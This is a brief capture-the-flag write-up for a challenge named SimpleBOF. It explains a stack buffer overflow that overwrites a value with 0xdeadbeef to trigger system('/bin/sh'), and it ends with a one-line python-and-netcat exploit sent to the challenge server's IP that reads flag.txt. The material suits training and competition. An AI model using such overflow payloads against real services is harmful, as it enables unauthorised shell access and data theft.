### 0x00 Challenge: SimpleBOF
**Description:**
>This is so simple.
>
>nc 168.119.247.237 5010

### 0x01 Write-up:
It is a basic BOF where you need to overflow 64 bytes and specify a 0xdeadbeef chain for system("/bin/sh") to be called.

**Exploit:**

(python -c "print 'A' * 64 + '\xef\xbe\xad\xde'";/bin/echo cat flag.txt) | nc 168.119.247.237 5010

